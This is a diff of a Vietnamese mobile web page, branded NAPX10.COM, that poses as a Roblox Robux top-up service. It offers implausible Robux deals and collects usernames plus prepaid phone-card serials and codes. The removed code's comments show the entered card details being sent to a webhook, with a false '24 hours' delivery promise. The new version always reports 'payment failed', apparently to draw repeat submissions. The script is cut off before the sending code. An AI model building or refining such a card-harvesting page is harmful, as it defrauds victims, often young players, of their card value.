@@ -3,565 +3,797 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cổng Thanh Toán Game Roblox</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Giả Lập Quy Trình Nạp Robux</title>
     <style>
-        /* Cài đặt chung */
+        /* --- CSS CƠ BẢN --- */
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f6f9;
+            background-color: #fff;
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
         }
 
-        /* --- PHẦN HEADER MÀU XANH LOGO --- */
-        .main-header {
-            background-color: #345e38; /* Màu xanh lục chủ đạo của logo */
-            color: white;
+        /* Thùng chứa chính */
+        .main-container {
+            width: 100%;
+            max-width: 480px; /* Độ rộng tối đa cho giao diện mobile */
+            height: 100vh;
+            border: 1px solid #ddd;
+            position: relative;
+            background-color: #fff;
+            overflow-y: auto;
+        }
+
+        /* --- HEADER (Tái tạo từ ảnh) --- */
+        header {
+            background-color: #345e38; /* Màu xanh lá đậm */
+            color: #fff;
+            padding: 10px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
-        .main-header .logo {
-            font-size: 22px;
-            font-weight: 900;
-            font-style: italic;
-            letter-spacing: 1px;
+        .logo-container {
             display: flex;
             align-items: center;
-            gap: 10px;
         }
 
-        .main-header .icons {
-            font-size: 20px;
+        .logo-text {
+            font-size: 1.1em;
+            font-weight: bold;
+            font-style: italic;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text span {
+            color: #ddd;
+        }
+
+        .header-icons {
             display: flex;
             gap: 15px;
+            font-size: 1.1em;
         }
 
-        /* --- PHẦN SUB-HEADER (Chọn Game & Lịch sử) --- */
-        .sub-header {
-            background: white;
-            padding: 15px 20px;
+        /* --- THANH TIẾN TRÌNH (PROGRESS BAR) --- */
+        .progress-bar-container {
+            background-color: #fff;
+            padding: 15px 10px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .progress-line {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #e0e0e0;
+            max-width: 320px;
+            margin: 0 auto;
+            position: relative;
         }
 
-        .sub-header .game-info {
+        .progress-line::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            width: 100%;
+            height: 1.5px;
+            background-color: #ddd;
+            z-index: 1;
+        }
+
+        .progress-step {
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            background-color: #ddd;
+            color: #777;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 0.85em;
+            font-weight: bold;
+            z-index: 2;
+            transition: background-color 0.3s;
+        }
+
+        .progress-step.active {
+            background-color: #345e38;
+            color: #fff;
+        }
+
+        /* --- CHUNG CHO CÁC BƯỚC --- */
+        .step-container {
+            padding: 20px;
+        }
+
+        .info-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .game-dropdown {
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-weight: bold;
+            gap: 8px;
             font-size: 1.1em;
-            color: #345e38;
-        }
-
-        .sub-header .game-info img {
-            width: 32px;
-            height: 32px;
-            border-radius: 6px;
-        }
-
-        .sub-header .history-link {
-            color: #345e38;
             font-weight: bold;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .game-dropdown img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .check-transaction {
+            font-weight: bold;
+            color: #345e38;
             text-decoration: none;
             font-size: 0.95em;
         }
 
-        /* --- THANH TIẾN TRÌNH (PROGRESS BAR) --- */
-        .progress-container {
-            background: white;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .progressbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            list-style: none;
-            padding: 0;
-            margin: 0 auto;
-            max-width: 400px;
-            position: relative;
-        }
-
-        /* Đường kẻ ngang phía sau */
-        .progressbar::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 10%;
-            right: 10%;
-            height: 2px;
-            background: #d3d3d3;
-            z-index: 1;
-            transform: translateY(-50%);
-        }
-
-        .progressbar li {
-            position: relative;
-            z-index: 2;
-            background: white;
-            padding: 0 5px;
-        }
-
-        .progressbar li .step {
-            width: 28px;
-            height: 28px;
-            line-height: 28px;
-            border-radius: 50%;
-            display: inline-block;
-            background: #f0f0f0;
-            color: #888;
-            font-weight: bold;
-            font-size: 13px;
-        }
-
-        .progressbar li.active .step {
-            background: #345e38; /* Màu xanh active */
-            color: white;
-        }
-
-        /* --- BỐ CỤC BẢNG FORM --- */
-        .form-wrapper {
-            display: flex;
-            justify-content: center;
-            padding: 15px;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .payment-form {
-            background: #fff;
-            max-width: 500px;
-            width: 100%;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            overflow: hidden;
-            margin-bottom: 15px;
-        }
-
-        h2.form-title {
-            text-align: center;
-            font-size: 1.4em;
-            color: #333;
-            margin: 20px 0;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        td {
-            padding: 15px;
-            border-top: 1px solid #eee;
-            border-bottom: 1px solid #eee;
-            vertical-align: middle;
-        }
-
-        /* Cột bên trái (Tên trường) */
-        td.label-col {
-            width: 30%;
-            text-align: center;
-            font-weight: bold;
-            color: #555;
-            border-right: 1px solid #eee;
-        }
-
-        /* Cột bên phải (Ô nhập) */
-        td.input-col {
-            width: 70%;
-            position: relative;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            box-sizing: border-box;
+        .section-label {
             font-size: 1em;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus {
-            border-color: #345e38;
-            box-shadow: 0 0 5px rgba(52, 94, 56, 0.3);
-        }
-
-        /* Ô Viettel khóa (Viền xanh dương) */
-        input.lock-input {
-            background-color: #f8f9fa;
-            border: 2px solid #a0c0ff;
-            color: #333;
-            cursor: not-allowed;
             font-weight: bold;
+            color: #333;
+            margin-bottom: 8px;
         }
 
         .help-text {
-            display: block;
-            text-align: center;
-            color: #d9534f;
+            color: #777;
             font-size: 0.85em;
-            font-weight: bold;
-            margin-top: 8px;
+            margin-left: 5px;
         }
 
-        .btn-submit {
-            width: 90%;
-            margin: 20px auto;
+        /* Nút bấm */
+        .primary-button {
             display: block;
-            padding: 14px;
-            background: #345e38;
-            color: #fff;
+            width: 100%;
+            padding: 15px;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 1.1em;
             font-weight: bold;
+            color: #fff;
+            background-color: #345e38; /* Màu xanh lá đậm */
             cursor: pointer;
+            margin-top: 15px;
             text-transform: uppercase;
         }
 
-        /* --- BẢNG CHỌN MỆNH GIÁ --- */
-        #menhGiaInput {
-            cursor: pointer;
-            background: white;
+        .primary-button:active {
+            background-color: #244227;
         }
 
-        .menh-gia-table {
-            display: none;
-            position: absolute;
-            top: 100%;
-            left: 15px;
-            right: 15px;
-            background: #fff;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            box-shadow: 0px 4px 12px rgba(0,0,0,0.15);
-            z-index: 100;
-            max-height: 250px;
-            overflow-y: auto;
-        }
-
-        .menh-gia-table.show {
-            display: block;
-        }
-
-        .menh-gia-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 15px;
-            cursor: pointer;
-            border-bottom: 1px solid #eee;
-        }
-
-        .menh-gia-item:hover { background: #f0f7f1; }
-
-        .item-robux-wrap {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: bold;
-            color: #345e38;
-        }
-
-        .item-vnd {
-            font-weight: bold;
-            color: #345e38;
-        }
-
-        /* Icon Robux Lục giác */
-        .robux-icon {
-            width: 18px;
-            height: 18px;
-            fill: none;
-            stroke: #333;
-            stroke-width: 2;
-        }
-
-        /* --- MENU THÔNG BÁO KHI BẤM NẠP XONG --- */
-        .success-box {
-            display: none;
-            background: #ffffff;
-            max-width: 500px;
+        /* Ô nhập liệu */
+        .input-field {
             width: 100%;
+            padding: 15px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            border: 1px dashed #345e38;
+            border: 1px solid #ddd;
+            font-size: 1.1em;
             box-sizing: border-box;
-            padding: 20px;
-            margin-top: 10px;
+            margin-bottom: 10px;
+            outline: none;
         }
 
-        .success-title {
-            color: #d9534f;
-            font-weight: bold;
-            text-align: center;
-            font-size: 1.2em;
-            margin-bottom: 15px;
-            text-transform: lowercase;
+        .input-field::placeholder {
+            color: #999;
         }
 
-        .success-row {
+        /* Thẻ nạp/gói nạp/nhà mạng */
+        .card-item {
+            background-color: #fff;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 15px;
             display: flex;
             justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px dotted #e0e0e0;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            transition: border-color 0.3s;
+        }
+
+        .card-item:active {
+            border-color: #345e38;
+        }
+
+        .robux-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.05em;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .robux-icon-hexagon {
+            width: 22px;
+            height: 22px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 0.85em;
+            border: 1px solid #aaa;
+            border-radius: 4px; /* Giả lập lục giác */
+            font-weight: bold;
+        }
+
+        .price-text {
+            font-size: 1.05em;
+            font-weight: bold;
+            color: #345e38;
+        }
+
+        /* Lưới chọn nhà mạng/gói nạp */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .grid-item {
+            background-color: #fff;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            transition: border-color 0.3s;
+        }
+
+        .grid-item:active {
+            border-color: #345e38;
+        }
+
+        .grid-item img {
+            max-width: 60%;
+            height: auto;
+        }
+
+        .grid-info {
+            text-align: center;
+        }
+
+        .grid-value {
+            font-size: 1em;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .grid-price {
+            font-size: 0.85em;
+            color: #345e38;
+            font-weight: bold;
+        }
+
+        /* --- BƯỚC 1 (Nhập Username) --- */
+        .dropdown-static {
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 1.1em;
+            background-color: #fff;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+
+        /* --- BƯỚC 2 (Chọn Gói Nạp) --- */
+        .profile-container {
+            background-color: #eee;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1.05em;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .profile-username {
+            flex-grow: 1;
+            text-align: center;
+        }
+
+        /* --- BƯỚC 3 (Chọn Nhà Mạng) --- */
+        .current-package {
+            background-color: #eee;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1.05em;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* --- BƯỚC 4 (Nhập Mã) --- */
+        .package-info-panel {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
             font-size: 0.95em;
         }
 
-        .success-row span:first-child {
-            color: #666;
+        .info-row .value {
             font-weight: bold;
-        }
-
-        .success-row span:last-child {
             color: #333;
-            font-weight: bold;
         }
 
+        .info-row .price {
+            font-weight: bold;
+            color: #345e38;
+        }
+
+        .warning-text {
+            color: #cc0000;
+            font-size: 0.85em;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .secondary-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #555;
+            background-color: #fff;
+            cursor: pointer;
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+
+        /* --- BƯỚC 5 (Thông Báo Thất Bại - Demo) --- */
+        .failure-box {
+            text-align: center;
+            padding: 30px;
+        }
+
+        .failure-icon {
+            color: #cc0000;
+            font-size: 5em;
+            margin-bottom: 10px;
+        }
+
+        .failure-title {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .failure-message {
+            color: #cc0000;
+            font-size: 1em;
+            margin-bottom: 20px;
+        }
+
+        .details-table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 0.9em;
+        }
+
+        .details-table td {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .details-table .label {
+            width: 35%;
+            color: #777;
+        }
+
+        .details-table .value {
+            font-weight: bold;
+            color: #333;
+        }
     </style>
 </head>
 <body>
+    <div class="main-container">
+        <header>
+            <div class="logo-container">
+                <span class="logo-text">NAPX10<span>.COM</span></span>
+            </div>
+            <div class="header-icons">
+                <i class="fas fa-user-circle"></i>
+                <i class="fas fa-bars"></i>
+            </div>
+        </header>
 
-<header class="main-header">
-    <div class="logo">
-        <i class="fa-solid fa-leaf" style="font-size: 18px;"></i> NAPX10.COM
-    </div>
-    <div class="icons">
-        <i class="fa-regular fa-circle-user"></i>
-        <i class="fa-solid fa-bars"></i>
-    </div>
-</header>
+        <div id="step-container">
+            <div class="progress-bar-container">
+                <div class="progress-line">
+                    <div class="progress-step active" id="progress1">1</div>
+                    <div class="progress-step" id="progress2">2</div>
+                    <div class="progress-step" id="progress3">3</div>
+                    <div class="progress-step" id="progress4">4</div>
+                </div>
+            </div>
 
-<div class="sub-header">
-    <div class="game-info">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png" alt="Roblox">
-        <span>Roblox <i class="fa-solid fa-caret-down" style="font-size: 0.8em;"></i></span>
-    </div>
-    <a href="#" class="history-link">Kiểm Tra Giao Dịch</a>
-</div>
+            <div id="step1" class="step-container">
+                <div class="info-header">
+                    <div class="game-dropdown">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+                        Roblox <i class="fas fa-caret-down"></i>
+                    </div>
+                    <a href="#" class="check-transaction">Kiểm Tra Giao Dịch</a>
+                </div>
 
-<div class="progress-container">
-    <ul class="progressbar">
-        <li class="active"><span class="step">1</span></li>
-        <li><span class="step">2</span></li>
-        <li><span class="step">3</span></li>
-        <li><span class="step">4</span></li>
-    </ul>
-</div>
+                <div class="section-label">Chọn game</div>
+                <div class="dropdown-static">
+                    Roblox <i class="fas fa-caret-down"></i>
+                </div>
 
-<div class="form-wrapper">
-    <div class="payment-form">
-        <h2 class="form-title">Mục Nạp Robux Roblox</h2>
-        
-        <form id="paymentForm">
-            <table>
-                <tr>
-                    <td class="label-col">Loại<br>Game:</td>
-                    <td class="input-col">
-                        <input type="text" value="Robux Roblox" readonly style="background: #f0f0f0; text-align: center; font-weight: bold;">
-                        <span class="help-text">Nhấp Vào Ảnh Để Đổi Game.</span>
-                    </td>
-                </tr>
-                <tr>
-                    <td class="label-col">Thông<br>Tin:</td>
-                    <td class="input-col">
-                        <input type="text" id="uidInput" placeholder="Nhập UID Hoặc USE Game">
-                    </td>
-                </tr>
-                <tr>
-                    <td class="label-col">Loại Thẻ:</td>
-                    <td class="input-col">
-                        <input type="text" value="Viettel" class="lock-input" readonly>
-                    </td>
-                </tr>
-                <tr>
-                    <td class="label-col">Mệnh<br>Giá:</td>
-                    <td class="input-col">
-                        <input type="text" id="menhGiaInput" placeholder="Chọn gói nhận" readonly>
-                        
-                        <div id="menhGiaTable" class="menh-gia-table">
-                            <div class="menh-gia-item" data-display="6,500 Robux" data-webhook="6,500 Robux (50,000 VNĐ)">
-                                <div class="item-robux-wrap">
-                                    <svg class="robux-icon" viewBox="0 0 24 24"><path d="M12 2L2 7.5V16.5L12 22L22 16.5V7.5L12 2Z"/><circle cx="12" cy="12" r="4"/></svg>
-                                    6,500 Robux
-                                </div>
-                                <div class="item-vnd">50,000VNĐ</div>
-                            </div>
-                            
-                            <div class="menh-gia-item" data-display="15,900 Robux" data-webhook="15,900 Robux (100,000 VNĐ)">
-                                <div class="item-robux-wrap">
-                                    <svg class="robux-icon" viewBox="0 0 24 24"><path d="M12 2L2 7.5V16.5L12 22L22 16.5V7.5L12 2Z"/><circle cx="12" cy="12" r="4"/></svg>
-                                    15,900 Robux
-                                </div>
-                                <div class="item-vnd">100,000VNĐ</div>
-                            </div>
+                <div class="section-label">
+                    Nhập ID Game hoặc Username 
+                    <span class="help-text">( Hướng dẫn lấy ID, Tài khoản )</span>
+                </div>
+                <input type="text" id="username" class="input-field" placeholder="Nhập ID Game hoặc Username">
 
-                            <div class="menh-gia-item" data-display="19,000 Robux" data-webhook="19,000 Robux (200,000 VNĐ)">
-                                <div class="item-robux-wrap">
-                                    <svg class="robux-icon" viewBox="0 0 24 24"><path d="M12 2L2 7.5V16.5L12 22L22 16.5V7.5L12 2Z"/><circle cx="12" cy="12" r="4"/></svg>
-                                    19,000 Robux
-                                </div>
-                                <div class="item-vnd">200,000VNĐ</div>
-                            </div>
+                <button class="primary-button" id="btn-step1" onclick="gotoStep2()">Đăng nhập</button>
 
-                            <div class="menh-gia-item" data-display="25,000 Robux" data-webhook="25,000 Robux (500,000 VNĐ)">
-                                <div class="item-robux-wrap">
-                                    <svg class="robux-icon" viewBox="0 0 24 24"><path d="M12 2L2 7.5V16.5L12 22L22 16.5V7.5L12 2Z"/><circle cx="12" cy="12" r="4"/></svg>
-                                    25,000 Robux
-                                </div>
-                                <div class="item-vnd">500,000VNĐ</div>
-                            </div>
-
-                            <div class="menh-gia-item" data-display="100,000 Robux" data-webhook="100,000 Robux (1,000,000 VNĐ)">
-                                <div class="item-robux-wrap">
-                                    <svg class="robux-icon" viewBox="0 0 24 24"><path d="M12 2L2 7.5V16.5L12 22L22 16.5V7.5L12 2Z"/><circle cx="12" cy="12" r="4"/></svg>
-                                    100,000 Robux
-                                </div>
-                                <div class="item-vnd">1,000,000VNĐ</div>
-                            </div>
+                <div style="opacity: 0.15; pointer-events: none; margin-top: 20px;">
+                    <div class="card-item">
+                        <div class="robux-info">
+                            <div class="robux-icon-hexagon">⬡</div>
+                            6,500 Robux
                         </div>
-                    </td>
-                </tr>
-                <tr>
-                    <td class="label-col">Số Seri:</td>
-                    <td class="input-col"><input type="text" id="seriInput" placeholder="Nhập seri thẻ"></td>
-                </tr>
-                <tr>
-                    <td class="label-col">Mã Thẻ:</td>
-                    <td class="input-col"><input type="text" id="maInput" placeholder="Nhập mã thẻ"></td>
-                </tr>
-            </table>
-            <button type="button" class="btn-submit" id="btnNap">Nạp</button>
-        </form>
+                        <div class="price-text">50,000VNĐ</div>
+                    </div>
+                    <div class="card-item">
+                        <div class="robux-info">
+                            <div class="robux-icon-hexagon">⬡</div>
+                            15,900 Robux
+                        </div>
+                        <div class="price-text">100,000VNĐ</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step2" class="step-container" style="display: none;">
+                <div class="info-header">
+                    <div class="game-dropdown">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+                        Roblox <i class="fas fa-caret-down"></i>
+                    </div>
+                    <a href="#" class="check-transaction">Kiểm Tra Giao Dịch</a>
+                </div>
+
+                <div class="section-label">Thông tin nhân vật</div>
+                <div class="profile-container">
+                    <span>Y</span>
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+
+                <div class="section-label">Chọn gói nạp</div>
+                <div class="grid-container">
+                    <div class="grid-item" onclick="selectPackage('6,500 Robux', '50,000')">
+                        <div class="robux-icon-hexagon" style="width:30px; height:30px; font-size:1.1em; border:1px solid #777;">⬡</div>
+                        <div class="grid-info">
+                            <div class="grid-value">6,500 Robux</div>
+                            <div class="grid-price">50,000 đ</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectPackage('15,900 Robux', '100,000')">
+                        <div class="robux-icon-hexagon" style="width:30px; height:30px; font-size:1.1em; border:1px solid #777;">⬡</div>
+                        <div class="grid-info">
+                            <div class="grid-value">15,900 Robux</div>
+                            <div class="grid-price">100,000 đ</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectPackage('19,000 Robux', '200,000')">
+                        <div class="robux-icon-hexagon" style="width:30px; height:30px; font-size:1.1em; border:1px solid #777;">⬡</div>
+                        <div class="grid-info">
+                            <div class="grid-value">19,000 Robux</div>
+                            <div class="grid-price">200,000 đ</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectPackage('25,000 Robux', '500,000')">
+                        <div class="robux-icon-hexagon" style="width:30px; height:30px; font-size:1.1em; border:1px solid #777;">⬡</div>
+                        <div class="grid-info">
+                            <div class="grid-value">25,000 Robux</div>
+                            <div class="grid-price">500,000 đ</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectPackage('100,000 Robux', '1,000,000')">
+                        <div class="robux-icon-hexagon" style="width:30px; height:30px; font-size:1.1em; border:1px solid #777;">⬡</div>
+                        <div class="grid-info">
+                            <div class="grid-value">100,000 Robux</div>
+                            <div class="grid-price">1,000,000 đ</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step3" class="step-container" style="display: none;">
+                <div class="info-header">
+                    <div class="game-dropdown">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+                        Roblox <i class="fas fa-caret-down"></i>
+                    </div>
+                    <a href="#" class="check-transaction">Kiểm Tra Giao Dịch</a>
+                </div>
+
+                <div class="section-label">Đã chọn gói</div>
+                <div class="current-package">
+                    <span id="display-package">--</span>
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+
+                <div class="section-label">Chọn phương thức thanh toán</div>
+                <div class="grid-container">
+                    <div class="grid-item" onclick="selectMethod('VIETTEL')">
+                        <img src="https://upload.wikimedia.org/wikipedia/vi/a/a2/Logo_Viettel.svg" alt="Viettel" style="max-width:70%;">
+                        <div class="grid-info">
+                            <div class="grid-value" id="method-price-viettel">--</div>
+                            <div class="price-text" style="font-size: 0.85em;">⬡ Robux</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectMethod('VINAPHONE')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/Logo-Vinaphone.svg" alt="Vinaphone" style="max-width:70%;">
+                        <div class="grid-info">
+                            <div class="grid-value" id="method-price-vinaphone">--</div>
+                            <div class="price-text" style="font-size: 0.85em;">⬡ Robux</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectMethod('MOBIFONE')">
+                        <img src="https://upload.wikimedia.org/wikipedia/vi/3/31/Mobifone-logo.svg" alt="Mobifone" style="max-width:70%;">
+                        <div class="grid-info">
+                            <div class="grid-value" id="method-price-mobifone">--</div>
+                            <div class="price-text" style="font-size: 0.85em;">⬡ Robux</div>
+                        </div>
+                    </div>
+                    <div class="grid-item" onclick="selectMethod('ZING')">
+                        <img src="https://upload.wikimedia.org/wikipedia/vi/3/3d/VNG_Corporation_logo.svg" alt="Zing" style="max-width:40%;">
+                        <div class="grid-info">
+                            <div class="grid-value" id="method-price-zing">--</div>
+                            <div class="price-text" style="font-size: 0.85em;">⬡ Robux</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step4" class="step-container" style="display: none;">
+                <div class="info-header">
+                    <div class="game-dropdown">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+                        Roblox <i class="fas fa-caret-down"></i>
+                    </div>
+                    <a href="#" class="check-transaction">Kiểm Tra Giao Dịch</a>
+                </div>
+
+                <div class="package-info-panel">
+                    <div class="info-row">
+                        <span>Gói nạp:</span>
+                        <span class="value price-text">
+                            <div class="robux-icon-hexagon" style="display: inline-flex;">⬡</div> 
+                            <span id="final-package-name">--</span>
+                        </span>
+                    </div>
+                    <div class="info-row" style="border-top:1px solid #eee; margin-top:10px; padding-top:10px;">
+                        <span>Tổng tiền:</span>
+                        <span class="price"><span id="final-package-price">--</span> đ</span>
+                    </div>
+                </div>
+
+                <div class="section-label">Thanh toán bằng thẻ <span id="final-method-name">--</span></div>
+                <div class="warning-text">
+                    <span style="text-decoration: underline; font-weight: bold;">Cảnh báo:</span>
+                    Người chơi vui lòng nạp đúng mệnh giá tương ứng gói nạp đã chọn. Giao dịch sai mệnh giá sẽ mất thẻ và không nhận được gói nạp.
+                </div>
+
+                <div class="section-label" style="color: #666; font-size: 1.1em; font-weight: bold; margin-bottom: 5px;">Mã serial</div>
+                <input type="text" id="serial" class="input-field" placeholder="• • •">
+
+                <div class="section-label" style="color: #666; font-size: 1.1em; font-weight: bold; margin-bottom: 5px;">Mã thẻ</div>
+                <input type="text" id="code" class="input-field" placeholder="• • •">
+
+                <button class="primary-button" onclick="gotoStep5()">Thanh toán</button>
+                <button class="secondary-button" onclick="goBackToStep3()">Quay lại</button>
+            </div>
+
+            <div id="step5" class="step-container failure-box" style="display: none;">
+                <div class="failure-icon">
+                    <i class="far fa-times-circle"></i>
+                </div>
+                <div class="failure-title">Thanh toán thất bại</div>
+                <div class="help-text">ID Giao Dịch: <span style="font-weight: bold; color: #333;" id="transaction-id">1234567890</span></div>
+
+                <div class="details-table-panel" style="background-color: #fcfcfc; border: 1px solid #eee; border-radius: 8px; padding: 20px; margin-top: 30px;">
+                    <table class="details-table">
+                        <tr>
+                            <td class="label">Người chơi</td>
+                            <td class="value" id="res-username">--</td>
+                        </tr>
+                        <tr>
+                            <td class="label">Phương thức thanh toán</td>
+                            <td class="value" id="res-method">--</td>
+                        </tr>
+                        <tr>
+                            <td class="label">Gói nạp</td>
+                            <td class="value">
+                                <span id="res-package">--</span> 
+                                <div class="robux-icon-hexagon" style="display: inline-flex; width: 18px; height: 18px; font-size: 0.75em; border: 1px solid #777;">⬡</div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="label">Game</td>
+                            <td class="value">Roblox</td>
+                        </tr>
+                        <tr>
+                            <td class="label">Mệnh giá</td>
+                            <td class="value"><span style="color:#cc0000;" id="res-price">--</span> đ</td>
+                        </tr>
+                        <tr>
+                            <td class="label">Trạng thái</td>
+                            <td class="value"><span style="color:#cc0000;" id="res-status">Vui lòng kiểm tra lại thông tin thẻ</span></td>
+                        </tr>
+                        <tr>
+                            <td class="label">Thời gian giao dịch</td>
+                            <td class="value" id="res-time">--:-- --/--/----</td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+
+        </div>
     </div>
 
-    <div class="success-box" id="successBox">
-        <div class="success-title">robux xẽ về sau 24h</div>
-        
-        <div class="success-row">
-            <span>Thời gian nạp:</span>
-            <span id="resTime">--:-- --/--/----</span>
-        </div>
-        <div class="success-row">
-            <span>Seri + Mã:</span>
-            <span id="resSeriMa">Chưa có</span>
-        </div>
-        <div class="success-row">
-            <span>Số Robux:</span>
-            <span id="resRobux" style="color: #345e38;">0 Robux</span>
-        </div>
-    </div>
-</div>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 
-<script>
-    // Logic chọn mệnh giá thả xuống
-    const menhGiaInput = document.getElementById('menhGiaInput');
-    const menhGiaTable = document.getElementById('menhGiaTable');
-    const items = document.querySelectorAll('.menh-gia-item');
-    let selectedWebhookText = "";
+    <script>
+        // Các biến lưu trữ dữ liệu nạp
+        let selectedUsername = "";
+        let selectedPackageName = "";
+        let selectedPackagePrice = "";
+        let selectedMethodName = "";
 
-    menhGiaInput.addEventListener('click', function(e) {
-        e.stopPropagation();
-        menhGiaTable.classList.toggle('show');
-    });
-
-    items.forEach(item => {
-        item.addEventListener('click', function() {
-            menhGiaInput.value = this.getAttribute('data-display');
-            selectedWebhookText = this.getAttribute('data-webhook');
-            menhGiaTable.classList.remove('show');
-        });
-    });
-
-    document.addEventListener('click', function() {
-        menhGiaTable.classList.remove('show');
-    });
-
-    // --- LOGIC XỬ LÝ KHI BẤM NÚT NẠP + GỬI WEBHOOK ---
-    document.getElementById('btnNap').addEventListener('click', function() {
-        const uid = document.getElementById('uidInput').value.trim();
-        const menhGia = menhGiaInput.value;
-        const seri = document.getElementById('seriInput').value.trim();
-        const ma = document.getElementById('maInput').value.trim();
-
-        // Kiểm tra dữ liệu đầu vào
-        if (!uid || !menhGia || !seri || !ma) {
-            alert('Vui lòng nhập đầy đủ toàn bộ thông tin!');
-            return;
+        // Hàm ẩn tất cả các bước
+        function hideAllSteps() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step5').style.display = 'none';
         }
 
-        // Lấy thời gian nạp hiện tại hệ thống
-        const now = new Date();
-        const timeString = now.getHours().toString().padStart(2, '0') + ':' + 
